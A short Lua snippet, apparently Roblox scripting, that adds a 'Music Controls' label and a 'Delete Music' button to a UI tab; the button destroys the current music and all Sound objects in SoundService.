musicTab:CreateLabel("Music Controls", "")
musicTab:CreateButton("Delete Music", function()
    if currentMusic then currentMusic:Destroy(); currentMusic = nil; end
    for _, s in ipairs(game:GetService("SoundService"):GetChildren()) do if s:IsA("Sound") then s:Destroy() end end
end)


